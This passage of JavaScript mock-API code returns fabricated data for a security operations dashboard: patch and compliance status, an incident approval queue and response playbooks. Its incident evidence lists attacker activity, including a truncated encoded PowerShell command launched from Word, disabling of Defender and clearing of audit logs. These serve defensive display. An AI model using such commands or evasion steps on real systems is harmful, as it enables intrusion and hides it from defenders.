'ransomware,double-extortion,data-theft' }] });
  if (p === '/vm/patches')        return ok([{ id: 1, cve_id: 'CVE-2024-3400', asset_name: 'VPN-GW-01', patch_status: 'pending', patch_version: 'PAN-OS 11.1.2-h3', restart_required: true, estimated_downtime: 30, assigned_to: 'network-ops@corp.com', scheduled_at: new Date(Date.now() + 3600000).toISOString(), installed_at: null, rollback_available: false, created_at: new Date(Date.now() - 5 * 86400000).toISOString() }, { id: 2, cve_id: 'CVE-2024-21887', asset_name: 'VPN-GW-01', patch_status: 'pending', patch_version: 'Ivanti CS 22.6R2.1', restart_required: true, estimated_downtime: 45, assigned_to: 'network-ops@corp.com', scheduled_at: null, installed_at: null, rollback_available: false, created_at: new Date(Date.now() - 14 * 86400000).toISOString() }, { id: 3, cve_id: 'CVE-2021-44228', asset_name: 'WEB-APP-01', patch_status: 'deferred', patch_version: 'Log4j 2.17.1', restart_required: true, estimated_downtime: 60, assigned_to: 'devops@corp.com', scheduled_at: new Date(Date.now() + 7 * 86400000).toISOString(), installed_at: null, rollback_available: false, failure_reason: 'App compatibility testing required', created_at: new Date(Date.now() - 180 * 86400000).toISOString() }, { id: 4, cve_id: 'CVE-2024-0519', asset_name: 'WIN-LAPTOP-042', patch_status: 'installed', patch_version: 'Chrome 120.0.6099.224', restart_required: false, estimated_downtime: 5, assigned_to: 'it-support@corp.com', scheduled_at: null, installed_at: new Date(Date.now() - 30 * 86400000).toISOString(), rollback_available: true, created_at: new Date(Date.now() - 60 * 86400000).toISOString() }, { id: 5, cve_id: 'CVE-2023-36025', asset_name: 'WIN-LAPTOP-042', patch_status: 'failed', patch_version: 'KB5032190', restart_required: true, estimated_downtime: 15, assigned_to: 'it-support@corp.com', scheduled_at: null, installed_at: null, failed_at: new Date(Date.now() - 7 * 86400000).toISOString(), failure_reason: 'Update installation failed with error 0x80070002 — disk space insufficient', rollback_available: false, created_at: new Date(Date.now() - 30 * 86400000).toISOString() }]);
  if (p === '/vm/compliance')     return ok({ overall_score: 71.4, frameworks: [{ name: 'PCI DSS 4.0', score: 68.2, status: 'failing', controls: [{ id: '6.3.3', title: 'All software components protected from known vulnerabilities', status: 'failing', finding: '14 critical/high CVEs unpatched beyond SLA', severity: 'critical' }, { id: '11.3.1', title: 'External vulnerability scans performed quarterly', status: 'passing', last_scan: '2026-07-10' }, { id: '11.3.2', title: 'Internal vulnerability scans performed quarterly', status: 'passing', last_scan: '2026-07-12' }, { id: '6.2.4', title: 'Cardholder data environment free of critical vulnerabilities', status: 'failing', finding: 'CVE-2024-3400 present on VPN gateway in CDE boundary' }] }, { name: 'CIS Controls v8', score: 74.1, status: 'partial', controls: [{ id: '7.1', title: 'Establish and maintain a vulnerability management process', status: 'passing' }, { id: '7.4', title: 'Perform automated application patch management', status: 'failing', finding: 'Automated patching not deployed on 4 critical assets' }, { id: '7.5', title: 'Perform automated vulnerability scans of internal enterprise assets', status: 'passing' }, { id: '7.6', title: 'Perform automated vulnerability scans of externally-exposed assets', status: 'passing' }] }, { name: 'NIST CSF 2.0', score: 76.8, status: 'partial', controls: [{ id: 'ID.RA-1', title: 'Asset vulnerabilities are identified and documented', status: 'passing' }, { id: 'ID.RA-2', title: 'Threat intelligence is received and analyzed', status: 'passing' }, { id: 'RS.MI-3', title: 'Newly identified vulnerabilities are mitigated or documented as accepted risks', status: 'failing', finding: '7 overdue findings with no exception documentation' }] }, { name: 'ISO 27001:2022', score: 69.3, status: 'failing', controls: [{ id: 'A.8.8', title: 'Management of technical vulnerabilities', status: 'failing', finding: 'Missing patches on critical assets beyond 30-day SLA' }, { id: 'A.8.29', title: 'Security testing in development and acceptance', status: 'partial' }] }], failed_controls: 7, missing_patches: 14, sla_violations: 7 });
  if (p === '/vm/scans')          return ok([{ id: 1, name: 'Weekly Network Scan — External', scan_type: 'network', target: '203.0.113.0/24', profile: 'full', status: 'completed', schedule: 'weekly', started_at: new Date(Date.now() - 86400000).toISOString(), finished_at: new Date(Date.now() - 84600000).toISOString(), findings_count: 12, created_by: 'system', created_at: new Date(Date.now() - 7 * 86400000).toISOString() }, { id: 2, name: 'Agent Scan — User Workstations', scan_type: 'agent', target: '10.0.1.0/24', profile: 'standard', status: 'completed', schedule: 'daily', started_at: new Date(Date.now() - 3600000).toISOString(), finished_at: new Date(Date.now() - 3000000).toISOString(), findings_count: 17, created_by: 'system', created_at: new Date(Date.now() - 86400000).toISOString() }, { id: 3, name: 'Cloud Scan — AWS Infrastructure', scan_type: 'cloud', target: 'AWS Account 123456789', profile: 'cloud', status: 'running', schedule: 'daily', started_at: new Date(Date.now() - 600000).toISOString(), finished_at: null, findings_count: 0, created_by: 'system', created_at: new Date(Date.now() - 600000).toISOString() }, { id: 4, name: 'Container Scan — EKS Cluster', scan_type: 'container', target: 'EKS-CLUSTER-01', profile: 'container', status: 'completed', schedule: 'on_push', started_at: new Date(Date.now() - 2 * 86400000).toISOString(), finished_at: new Date(Date.now() - 2 * 86400000 + 900000).toISOString(), findings_count: 6, created_by: 'system', created_at: new Date(Date.now() - 2 * 86400000).toISOString() }]);
  if (p === '/vm/exceptions')     return ok([{ id: 1, cve_id: 'CVE-2021-44228', exception_type: 'temporary', reason: 'Application compatibility testing required before Log4j upgrade. Expected patch date: 2026-07-31.', compensating_control: 'Network-level WAF rule blocking Log4j JNDI lookups. Enhanced monitoring on WEB-APP-01.', approved_by: 'm.kumar', status: 'approved', expires_at: '2026-07-31T00:00:00Z', created_by: 'devops@corp.com', created_at: new Date(Date.now() - 180 * 86400000).toISOString() }, { id: 2, cve_id: 'CVE-2024-26198', exception_type: 'risk_acceptance', reason: 'Vulnerability requires local access — user laptops not in scope for this risk acceptance period.', compensating_control: 'EDR agent blocking known exploit patterns. Phishing training reinforced.', approved_by: null, status: 'pending', expires_at: '2026-10-01T00:00:00Z', created_by: 'a.chen', created_at: new Date(Date.now() - 3 * 86400000).toISOString() }]);

  // ── Approval Queue Enterprise ─────────────────────────────────────────────
  if (p === '/aq/dashboard')    return ok({ pending: 4, approved: 118, rejected: 12, expired: 2, high_risk: 6, emergency: 1, avg_approval_time_min: 12.4, sla_compliance: 91.2, total_requests: 132, auto_approved: 87 });
  if (p === '/aq/analytics')    return ok({ avg_approval_time_min: 12.4, total: 132, pending: 4, approved: 118, rejected: 12, sla_violations: 2, emergency_requests: 1, auto_approved: 87, by_category: [{ category: 'endpoint', count: 42, auto: 18, approved: 20, rejected: 4 }, { category: 'identity', count: 31, auto: 8, approved: 19, rejected: 4 }, { category: 'network', count: 28, auto: 25, approved: 3, rejected: 0 }, { category: 'email', count: 19, auto: 2, approved: 14, rejected: 3 }, { category: 'cloud', count: 12, auto: 3, approved: 8, rejected: 1 }], by_team: [{ team: 'SOC Tier 2', approved: 31, avg_time_min: 8.2 }, { team: 'SOC Tier 3', approved: 24, avg_time_min: 14.1 }, { team: 'Identity Team', approved: 19, avg_time_min: 22.6 }, { team: 'Cloud Security', approved: 8, avg_time_min: 31.4 }], trend: [{ date: '07-10', requests: 8, approved: 7, rejected: 1 }, { date: '07-11', requests: 14, approved: 12, rejected: 2 }, { date: '07-12', requests: 6, approved: 5, rejected: 1 }, { date: '07-13', requests: 18, approved: 16, rejected: 2 }, { date: '07-14', requests: 22, approved: 19, rejected: 3 }, { date: '07-15', requests: 11, approved: 10, rejected: 1 }, { date: '07-16', requests: 15, approved: 13, rejected: 2 }, { date: '07-17', requests: 7, approved: 5, rejected: 0 }] });
  if (p === '/aq/queue')        return ok([
    { id: 1, approval_id: 'AQ-2026-000047', request_type: 'endpoint', action_category: 'endpoint', severity: 'critical', risk_score: 96, requested_action: 'Isolate endpoint WS-ANALYST-01 (Cobalt Strike beacon detected)', target_asset: 'WS-ANALYST-01', target_user: 'j.wilson', requester: 'SOAR-Automation', current_approver: 'j.smith', status: 'pending', incident_id: 'INC-2026-0714-001', case_id: 'CASE-2026-0142', alert_id: 'ALT-0001', mitre_technique: 'T1055.012', business_impact: 'User loses network access for ~2-4 hours', risk_level: 'critical', policy: 'manager_approval', is_emergency: false, due_at: new Date(Date.now() + 900000).toISOString(), created_at: new Date(Date.now() - 600000).toISOString(), updated_at: new Date(Date.now() - 600000).toISOString() },
    { id: 2, approval_id: 'AQ-2026-000046', request_type: 'identity', action_category: 'identity', severity: 'critical', risk_score: 91, requested_action: 'Disable Domain Admin account: CORP\\svc_backup (credential theft confirmed)', target_asset: 'CORP\\svc_backup', target_user: 'svc_backup', requester: 'j.smith', current_approver: 'm.kumar', status: 'pending', incident_id: 'INC-2026-0714-001', case_id: 'CASE-2026-0142', risk_level: 'critical', policy: 'dual_approval', is_emergency: false, due_at: new Date(Date.now() + 600000).toISOString(), created_at: new Date(Date.now() - 1200000).toISOString(), updated_at: new Date(Date.now() - 1200000).toISOString() },
    { id: 3, approval_id: 'AQ-2026-000045', request_type: 'network', action_category: 'network', severity: 'high', risk_score: 78, requested_action: 'Block outbound traffic to 185.220.101.47 at perimeter firewall', target_asset: 'Perimeter Firewall', target_user: '', requester: 'SOAR-Automation', current_approver: 'a.chen', status: 'pending', incident_id: 'INC-2026-0714-001', risk_level: 'high', policy: 'soc_lead', is_emergency: false, due_at: new Date(Date.now() + 1800000).toISOString(), created_at: new Date(Date.now() - 300000).toISOString(), updated_at: new Date(Date.now() - 300000).toISOString() },
    { id: 4, approval_id: 'AQ-2026-000044', request_type: 'email', action_category: 'email', severity: 'high', risk_score: 72, requested_action: 'Delete 147 phishing emails from all mailboxes (Q4_Report.docx campaign)', target_asset: 'Exchange/M365', target_user: '', requester: 'a.chen', current_approver: 'j.smith', status: 'pending', incident_id: 'INC-2026-0713-004', risk_level: 'high', policy: 'manager_approval', is_emergency: false, due_at: new Date(Date.now() + 3600000).toISOString(), created_at: new Date(Date.now() - 900000).toISOString(), updated_at: new Date(Date.now() - 900000).toISOString() },
    { id: 5, approval_id: 'AQ-2026-000043', request_type: 'cloud', action_category: 'cloud', severity: 'critical', risk_score: 94, requested_action: 'Revoke AWS IAM credentials for compromised key AKIA...XMPL', target_asset: 'AWS/IAM', target_user: 'devops-automation', requester: 'SOAR-Automation', current_approver: 'l.patel', status: 'delegated', incident_id: 'INC-2026-0712-002', risk_level: 'critical', policy: 'manager_approval', is_emergency: false, due_at: new Date(Date.now() - 1800000).toISOString(), created_at: new Date(Date.now() - 7200000).toISOString(), updated_at: new Date(Date.now() - 3600000).toISOString() },
    { id: 6, approval_id: 'AQ-2026-000038', request_type: 'endpoint', action_category: 'endpoint', severity: 'critical', risk_score: 98, requested_action: 'Kill ransomware process + isolate server DB-PROD-01 (active encryption detected)', target_asset: 'DB-PROD-01', target_user: '', requester: 'j.smith', current_approver: 'ciso', status: 'approved', incident_id: 'INC-2026-0710-001', risk_level: 'critical', policy: 'dual_approval', is_emergency: true, due_at: new Date(Date.now() - 86400000).toISOString(), approved_at: new Date(Date.now() - 86400000 + 120000).toISOString(), created_at: new Date(Date.now() - 86400000).toISOString(), updated_at: new Date(Date.now() - 86400000 + 120000).toISOString() },
    { id: 7, approval_id: 'AQ-2026-000035', request_type: 'identity', action_category: 'active_directory', severity: 'medium', risk_score: 54, requested_action: 'Reset password for j.doe (policy violation — shared credentials detected)', target_asset: 'Active Directory', target_user: 'j.doe', requester: 'a.chen', current_approver: 'd.jones', status: 'rejected', incident_id: '', case_id: '', risk_level: 'medium', policy: 'soc_lead', is_emergency: false, due_at: new Date(Date.now() - 172800000).toISOString(), created_at: new Date(Date.now() - 172800000).toISOString(), updated_at: new Date(Date.now() - 172800000 + 600000).toISOString() },
  ]);
  if (/^\/aq\/queue\/\d+$/.test(p)) return ok({ id: 1, approval_id: 'AQ-2026-000047', request_type: 'endpoint', action_category: 'endpoint', severity: 'critical', risk_score: 96, description: 'SOAR detected Cobalt Strike beacon communication from WS-ANALYST-01 to confirmed C2 IP 185.220.101.47. Process hollowing confirmed. LSASS credential dump detected. Host isolation required to prevent lateral movement.', requested_action: 'Isolate endpoint WS-ANALYST-01 from network (block all inbound/outbound except EDR and XCLOAK agent traffic)', target_asset: 'WS-ANALYST-01', target_user: 'j.wilson', requester: 'SOAR-Automation', current_approver: 'j.smith', status: 'pending', incident_id: 'INC-2026-0714-001', case_id: 'CASE-2026-0142', alert_id: 'ALT-0001', mitre_technique: 'T1055.012 (Process Hollowing), T1003.001 (LSASS Memory), T1562.001 (Defense Evasion)', business_impact: 'User j.wilson will lose network access for estimated 2-4 hours. WS-ANALYST-01 is a workstation — no production services.', risk_level: 'critical', policy: 'manager_approval', is_emergency: false, due_at: new Date(Date.now() + 900000).toISOString(), created_at: new Date(Date.now() - 600000).toISOString(), updated_at: new Date(Date.now() - 600000).toISOString() });
  if (/^\/aq\/queue\/\d+\/comments$/.test(p)) return ok([{ id: 1, author: 'j.smith', content: 'Confirmed Cobalt Strike beacon via Velociraptor live response. Memory artifact uploaded to case.', comment_type: 'evidence', created_at: new Date(Date.now() - 300000).toISOString() }, { id: 2, author: 'a.chen', content: 'Cross-referenced TI — IP 185.220.101.47 attributed to APT29-like actor. Confidence 97%.', comment_type: 'note', created_at: new Date(Date.now() - 180000).toISOString() }]);
  if (/^\/aq\/queue\/\d+\/timeline$/.test(p)) return ok([{ id: 1, actor: 'SOAR-Automation', action: 'created', details: 'Request submitted via API — Cobalt Strike beacon detection triggered playbook', created_at: new Date(Date.now() - 600000).toISOString() }, { id: 2, actor: 'SOAR-Automation', action: 'assigned', details: 'Auto-assigned to j.smith (SOC Team Lead, active shift)', created_at: new Date(Date.now() - 590000).toISOString() }, { id: 3, actor: 'j.smith', action: 'commented', details: 'Confirmed Cobalt Strike beacon via Velociraptor live response', created_at: new Date(Date.now() - 300000).toISOString() }, { id: 4, actor: 'a.chen', action: 'commented', details: 'TI cross-reference confirms attribution', created_at: new Date(Date.now() - 180000).toISOString() }]);
  if (/^\/aq\/queue\/\d+\/evidence$/.test(p)) return ok({ related_alerts: [{ id: 'ALT-0001', title: 'Process Hollowing: WINWORD.EXE → explorer.exe', severity: 'critical', created_at: new Date(Date.now() - 14400000).toISOString() }, { id: 'ALT-0002', title: 'AMSI Bypass via Reflection Patch', severity: 'critical', created_at: new Date(Date.now() - 14400000).toISOString() }, { id: 'ALT-0003', title: 'Defender Real-Time Protection Disabled', severity: 'high', created_at: new Date(Date.now() - 10800000).toISOString() }], incident: { id: 'INC-2026-0714-001', title: 'Cobalt Strike Beacon — WS-ANALYST-01', severity: 'critical', status: 'in_progress' }, threat_intel: { indicator: '185.220.101.47', verdict: 'malicious', confidence: 97, category: 'C2 Server', threat_actor: 'Unknown (APT29-like TTPs)', first_seen: '2024-03-15' }, process_tree: [{ pid: 8832, name: 'WINWORD.EXE', parent: 'explorer.exe', cmdline: 'WINWORD.EXE /n Q4_Report.docx', suspicious: true }, { pid: 7142, name: 'powershell.exe', parent: 'WINWORD.EXE', cmdline: 'powershell.exe -nop -enc SQBFAF...', suspicious: true }, { pid: 4512, name: 'explorer.exe (hollowed)', parent: 'userinit.exe', cmdline: 'C:\\Windows\\Explorer.EXE', suspicious: true }], recent_logs: [{ time: new Date(Date.now() - 14400000).toISOString(), event: '4688', description: 'WINWORD.EXE spawned powershell.exe with encoded command' }, { time: new Date(Date.now() - 13800000).toISOString(), event: '4657', description: 'Registry: DisableAntiSpyware = 1' }, { time: new Date(Date.now() - 13500000).toISOString(), event: '1102', description: 'Audit log cleared — Security event log' }, { time: new Date(Date.now() - 12600000).toISOString(), event: '10', description: 'Sysmon: Process accessed lsass.exe with PROCESS_ALL_ACCESS' }] });
  if (p === '/aq/policies')     return ok([{ id: 1, name: 'Workstation Isolation', action_type: 'isolate_endpoint', asset_criticality: 'low', policy: 'soc_lead', approvers: 'SOC Team Lead', auto_conditions: 'severity=critical AND confidence>90', enabled: true, created_at: new Date(Date.now() - 86400000 * 90).toISOString() }, { id: 2, name: 'Server Isolation', action_type: 'isolate_endpoint', asset_criticality: 'high', policy: 'manager_approval', approvers: 'SOC Manager', auto_conditions: '', enabled: true, created_at: new Date(Date.now() - 86400000 * 90).toISOString() }, { id: 3, name: 'DA Account Disable', action_type: 'disable_user', asset_criticality: 'critical', policy: 'dual_approval', approvers: 'SOC Manager,Identity Team', auto_conditions: '', enabled: true, created_at: new Date(Date.now() - 86400000 * 60).toISOString() }, { id: 4, name: 'IP Block (Automatic)', action_type: 'block_ip', asset_criticality: 'any', policy: 'automatic', approvers: 'auto', auto_conditions: 'confidence>95 AND source=threat_intel', enabled: true, created_at: new Date(Date.now() - 86400000 * 60).toISOString() }, { id: 5, name: 'Phishing Email Delete', action_type: 'delete_emails', asset_criticality: 'any', policy: 'manager_approval', approvers: 'SOC Manager', auto_conditions: '', enabled: true, created_at: new Date(Date.now() - 86400000 * 30).toISOString() }]);
  if (p === '/aq/matrix')       return ok([{ action: 'Kill malware process on workstation', category: 'endpoint', asset_criticality: 'low', requirement: 'automatic', approvers: 'auto', risk: 'low' }, { action: 'Isolate workstation', category: 'endpoint', asset_criticality: 'medium', requirement: 'soc_lead', approvers: 'SOC Team Lead', risk: 'medium' }, { action: 'Isolate server', category: 'endpoint', asset_criticality: 'high', requirement: 'manager_approval', approvers: 'SOC Manager', risk: 'high' }, { action: 'Disable standard user', category: 'identity', asset_criticality: 'low', requirement: 'soc_lead', approvers: 'SOC Team Lead', risk: 'medium' }, { action: 'Disable Domain Admin', category: 'identity', asset_criticality: 'high', requirement: 'dual_approval', approvers: 'SOC Manager + Identity Team', risk: 'critical' }, { action: 'Disable Executive account', category: 'identity', asset_criticality: 'critical', requirement: 'executive_approval', approvers: 'CISO + HR', risk: 'critical' }, { action: 'Block IP at firewall', category: 'network', asset_criticality: 'any', requirement: 'automatic', approvers: 'auto', risk: 'low' }, { action: 'Update perimeter firewall', category: 'network', asset_criticality: 'any', requirement: 'soc_lead', approvers: 'SOC Lead + Network', risk: 'high' }, { action: 'Stop production database', category: 'endpoint', asset_criticality: 'critical', requirement: 'dual_approval', approvers: 'SOC Manager + App Owner', risk: 'critical' }, { action: 'Delete phishing emails', category: 'email', asset_criticality: 'any', requirement: 'manager_approval', approvers: 'SOC Manager', risk: 'high' }, { action: 'Stop EC2 instance', category: 'cloud', asset_criticality: 'medium', requirement: 'soc_lead', approvers: 'SOC Lead + Cloud', risk: 'high' }, { action: 'Revoke AWS IAM credentials', category: 'cloud', asset_criticality: 'any', requirement: 'manager_approval', approvers: 'SOC Manager + Cloud Security', risk: 'high' }, { action: 'Reset password (standard)', category: 'identity', asset_criticality: 'any', requirement: 'automatic', approvers: 'auto', risk: 'low' }, { action: 'Reset Domain Controller password', category: 'active_directory', asset_criticality: 'critical', requirement: 'executive_approval', approvers: 'CISO + IT Director', risk: 'critical' }]);
  if (p === '/aq/approvers')    return ok([{ id: 'j.smith', name: 'James Smith', role: 'SOC Team Lead', team: 'SOC Tier 3', available: true }, { id: 'a.chen', name: 'Alice Chen', role: 'SOC Analyst', team: 'SOC Tier 2', available: true }, { id: 'm.kumar', name: 'Meera Kumar', role: 'SOC Manager', team: 'Management', available: false }, { id: 'd.jones', name: 'David Jones', role: 'Identity Team Lead', team: 'Identity', available: true }, { id: 'l.patel', name: 'Lisa Patel', role: 'Cloud Security Lead', team: 'Cloud', available: true }, { id: 'ciso', name: 'CISO', role: 'Chief Information Security Officer', team: 'Executive', available: true }]);
  if (p === '/aq/audit')        return ok([{ id: 101, request_id: 6, approval_id: 'AQ-2026-000038', actor: 'j.smith', action: 'emergency_override', details: 'BREAK GLASS: Active ransomware encryption on prod DB — immediate isolation required', ip_address: '10.0.1.42', created_at: new Date(Date.now() - 86400000).toISOString() }, { id: 100, request_id: 5, approval_id: 'AQ-2026-000043', actor: 'l.patel', action: 'delegated', details: 'Delegated to d.jones: Out of office — Cloud Security coverage', ip_address: '10.0.1.55', created_at: new Date(Date.now() - 7200000).toISOString() }, { id: 99, request_id: 4, approval_id: 'AQ-2026-000044', actor: 'SOAR-Automation', action: 'created', details: 'Request submitted — 147 phishing emails identified in Q4_Report.docx campaign', ip_address: '10.0.0.10', created_at: new Date(Date.now() - 900000).toISOString() }, { id: 98, request_id: 3, approval_id: 'AQ-2026-000045', actor: 'SOAR-Automation', action: 'created', details: 'Request submitted — block outbound to 185.220.101.47', ip_address: '10.0.0.10', created_at: new Date(Date.now() - 300000).toISOString() }, { id: 97, request_id: 2, approval_id: 'AQ-2026-000046', actor: 'j.smith', action: 'created', details: 'Manual request — credential theft confirmed via honeytoken', ip_address: '10.0.1.42', created_at: new Date(Date.now() - 1200000).toISOString() }, { id: 96, request_id: 1, approval_id: 'AQ-2026-000047', actor: 'SOAR-Automation', action: 'created', details: 'Request submitted via Cobalt Strike detection playbook', ip_address: '10.0.0.10', created_at: new Date(Date.now() - 600000).toISOString() }, { id: 95, request_id: 7, approval_id: 'AQ-2026-000035', actor: 'd.jones', action: 'rejected', details: 'Not sufficient evidence of credential sharing — needs HR confirmation first', ip_address: '10.0.1.61', created_at: new Date(Date.now() - 172800000 + 600000).toISOString() }]);

  // ── Playbooks Enterprise ──────────────────────────────────────────────────
  if (p === '/pb/dashboard')    return ok({ total_playbooks: 12, active_playbooks: 8, draft_playbooks: 3, archived_playbooks: 1, running_executions: 2, successful_runs: 218, failed_runs: 13, avg_exec_time_s: 38.4, automation_coverage: 78.5, pending_approvals: 3, total_executions: 247 });
  if (p === '/pb/analytics')    return ok({ success_rate: 94.7, total_runs: 247, successful_runs: 218, failed_runs: 13, avg_runtime_s: 38, time_saved_h: 163.5, analyst_hours_saved: 109, automation_coverage: 78.5, most_used: [{ name: 'IOC Block', runs: 128, success_rate: 99.2 }, { name: 'Ransomware Response', runs: 47, success_rate: 94.5 }, { name: 'Phishing Response', runs: 31, success_rate: 97.0 }, { name: 'Malware Triage', runs: 22, success_rate: 86.4 }, { name: 'Password Spray', runs: 14, success_rate: 92.9 }], manual_vs_automated: { manual: 22, automated: 78 }, failed_steps: [{ step: 'Isolate Endpoint', count: 8, reason: 'Agent offline' }, { step: 'Block IP', count: 5, reason: 'Firewall API timeout' }, { step: 'Create Ticket', count: 3, reason: 'Jira rate limit' }], trend: [{ date: '07-09', runs: 12, success: 11 }, { date: '07-10', runs: 18, success: 17 }, { date: '07-11', runs: 24, success: 22 }, { date: '07-12', runs: 9, success: 8 }, { date: '07-13', runs: 31, success: 29 }, { date: '07-14', runs: 27, success: 25 }, { date: '07-15', runs: 19, success: 18 }, { date: '07-16', runs: 14, success: 13 }] });
  if (p === '/pb/library')      return ok([{ id: 1, name: 'Ransomware Response', description: 'Full ransomware containment — C2 block, endpoint isolation, evidence preservation, executive notification', category: 'incident_response', trigger_type: 'alert_critical', status: 'active', version: '1.2.0', author: 'j.smith', execution_count: 47, success_count: 44, avg_runtime_s: 91, tags: 'ransomware,critical,containment', created_at: new Date(Date.now() - 86400000 * 30).toISOString(), updated_at: new Date(Date.now() - 86400000).toISOString() }, { id: 2, name: 'Phishing Response', description: 'Phishing email triage — header analysis, URL sandbox, sender block, user notification', category: 'email_security', trigger_type: 'alert_high', status: 'active', version: '2.0.1', author: 'a.chen', execution_count: 31, success_count: 30, avg_runtime_s: 45, tags: 'phishing,email,awareness', created_at: new Date(Date.now() - 86400000 * 20).toISOString(), updated_at: new Date(Date.now() - 86400000 * 2).toISOString() }, { id: 3, name: 'IOC Block Automation', description: 'Automatically block IPs/domains/hashes from threat intelligence feeds without human intervention', category: 'threat_intel', trigger_type: 'ioc_match', status: 'active', version: '3.1.0', author: 'system', execution_count: 128, success_count: 127, avg_runtime_s: 8, tags: 'ioc,block,automated', created_at: new Date(Date.now() - 86400000 * 60).toISOString(), updated_at: new Date(Date.now() - 3600000).toISOString() }, { id: 4, name: 'Malware Triage', description: 'Malware detection → file quarantine, process kill, memory dump, threat intel enrichment', category: 'endpoint', trigger_type: 'ioc_match', status: 'active', version: '1.0.3', author: 'm.kumar', execution_count: 22, success_count: 19, avg_runtime_s: 62, tags: 'malware,edr,endpoint', created_at: new Date(Date.now() - 86400000 * 15).toISOString(), updated_at: new Date(Date.now() - 86400000 * 3).toISOString() }, { id: 5, name: 'Password Spray Response', description: 'Password spray → lock accounts, force MFA, alert AD team, trigger threat hunt', category: 'identity', trigger_type: 'alert_medium', status: 'active', version: '1.1.0', author: 'a.chen', execution_count: 14, success_count: 13, avg_runtime_s: 22, tags: 'identity,ad,brute-force', created_at: new Date(Date.now() - 86400000 * 10).toISOString(), updated_at: new Date(Date.now() - 86400000 * 5).toISOString() }, { id: 6, name: 'Cloud IAM Response', description: 'AWS/Azure IAM compromise → revoke credentials, snapshot instance, audit CloudTrail', category: 'cloud', trigger_type: 'alert_critical', status: 'active', version: '1.0.0', author: 'j.smith', execution_count: 8, success_count: 7, avg_runtime_s: 74, tags: 'cloud,aws,iam', created_at: new Date(Date.now() - 86400000 * 7).toISOString(), updated_at: new Date(Date.now() - 86400000 * 7).toISOString() }, { id: 7, name: 'Insider Threat Response', description: 'HR workflow — disable account, legal hold, manager notification, DLP evidence collection', category: 'ueba', trigger_type: 'alert_high', status: 'draft', version: '0.9.0', author: 'm.kumar', execution_count: 0, success_count: 0, avg_runtime_s: 0, tags: 'insider,hr,legal', created_at: new Date(Date.now() - 86400000 * 3).toISOString(), updated_at: new Date(Date.now() - 86400000 * 3).toISOString() }, { id: 8, name: 'Web Shell Detection', description: 'Web shell → collect IOCs, block suspicious process, snapshot server, alert DevOps', category: 'web_security', trigger_type: 'alert_high', status: 'active', version: '1.0.1', author: 'a.chen', execution_count: 5, success_count: 5, avg_runtime_s: 35, tags: 'webshell,server', created_at: new Date(Date.now() - 86400000 * 12).toISOString(), updated_at: new Date(Date.now() - 86400000 * 12).toISOString() }]);
  if (/^\/pb\/library\/\d+$/.test(p) && method === 'GET') return ok({ id: 1, name: 'Ransomware Response', description: 'Full ransomware containment', category: 'incident_response', trigger_type: 'alert_critical', status: 'active', version: '1.2.0', author: 'j.smith', workflow: '{"nodes":[],"edges":[]}', variables: '{}', approval_policy: 'dual_approval', execution_count: 47, success_count: 44, avg_runtime_s: 91, tags: 'ransomware,critical', created_at: new Date(Date.now() - 86400000 * 30).toISOString(), updated_at: new Date(Date.now() - 86400000).toISOString() });
  if (/^\/pb\/library\/\d+\/workflow$/.test(p) && method === 'GET') return ok({ nodes: [{ id: 'n1', type: 'trigger', label: 'Alert Created', icon: '🚨', x: 310, y: 40, config: {} }, { id: 'n2', type: 'logic', label: 'IF: severity == critical', icon: '❓', x: 310, y: 160, config: { condition: "severity == 'critical'" } }, { id: 'n3', type: 'human', label: 'Approve Action', icon: '✅', x: 310, y: 280, config: { policy: 'dual_approval' } }, { id: 'n4', type: 'action', label: 'Block IP', icon: '🛡', x: 180, y: 400, config: { timeout: 30 } }, { id: 'n5', type: 'action', label: 'Isolate Endpoint', icon: '🔒', x: 440, y: 400, config: { timeout: 60 } }, { id: 'n6', type: 'action', label: 'Create Ticket', icon: '🎫', x: 310, y: 520, config: { timeout: 30 } }, { id: 'n7', type: 'action', label: 'Create Report', icon: '📊', x: 310, y: 640, config: { timeout: 60 } }], edges: [{ id: 'e1', from: 'n1', to: 'n2' }, { id: 'e2', from: 'n2', to: 'n3', label: 'YES' }, { id: 'e3', from: 'n3', to: 'n4' }, { id: 'e4', from: 'n3', to: 'n5' }, { id: 'e5', from: 'n4', to: 'n6' }, { id: 'e6', from: 'n5', to: 'n6' }, { id: 'e7', from: 'n6', to: 'n7' }] });
  if (/^\/pb\/library\/\d+\/versions$/.test(p)) return ok([{ version: '1.2.0', author: 'j.smith', published_at: new Date(Date.now() - 86400000).toISOString(), status: 'active', changelog: 'Added parallel block IP and domain steps' }, { version: '1.1.0', author: 'j.smith', published_at: new Date(Date.now() - 86400000 * 7).toISOString(), status: 'archived', changelog: 'Added approval gate before isolation' }, { version: '1.0.0', author: 'system', published_at: new Date(Date.now() - 86400000 * 30).toISOString(), status: 'archived', changelog: 'Initial version' }]);
  if (p === '/pb/executions')   return ok([{ id: 1, execution_id: 'EX-2026-000001', playbook_name: 'Ransomware Response', status: 'success', trigger_type: 'alert_critical', analyst: 'j.smith', started_at: new Date(Date.now() - 3600000).toISOString(), ended_at: new Date(Date.now() - 3510000).toISOString(), duration_s: 91, failed_step: '', is_dry_run: false }, { id: 2, execution_id: 'EX-2026-000002', playbook_name: 'Phishing Response', status: 'success', trigger_type: 'alert_high', analyst: 'a.chen', started_at: new Date(Date.now() - 7200000).toISOString(), ended_at: new Date(Date.now() - 7155000).toISOString(), duration_s: 45, failed_step: '', is_dry_run: false }, { id: 3, execution_id: 'EX-2026-000003', playbook_name: 'IOC Block Automation', status: 'success', trigger_type: 'ioc_match', analyst: 'system', started_at: new Date(Date.now() - 10800000).toISOString(), ended_at: new Date(Date.now() - 10792000).toISOString(), duration_s: 8, failed_step: '', is_dry_run: false }, { id: 4, execution_id: 'EX-2026-000004', playbook_name: 'Malware Triage', status: 'failed', trigger_type: 'ioc_match', analyst: 'system', started_at: new Date(Date.now() - 14400000).toISOString(), ended_at: new Date(Date.now() - 14338000).toISOString(), duration_s: 62, failed_step: 'Isolate Endpoint', is_dry_run: false }, { id: 5, execution_id: 'EX-2026-000005', playbook_name: 'Ransomware Response', status: 'running', trigger_type: 'manual', analyst: 'm.kumar', started_at: new Date(Date.now() - 30000).toISOString(), ended_at: null, duration_s: 0, failed_step: '', is_dry_run: false }, { id: 6, execution_id: 'EX-2026-000006', playbook_name: 'Phishing Response', status: 'success', trigger_type: 'alert_high', analyst: 'a.chen', started_at: new Date(Date.now() - 86400000).toISOString(), ended_at: new Date(Date.now() - 86400000 + 45000).toISOString(), duration_s: 45, failed_step: '', is_dry_run: true }]);
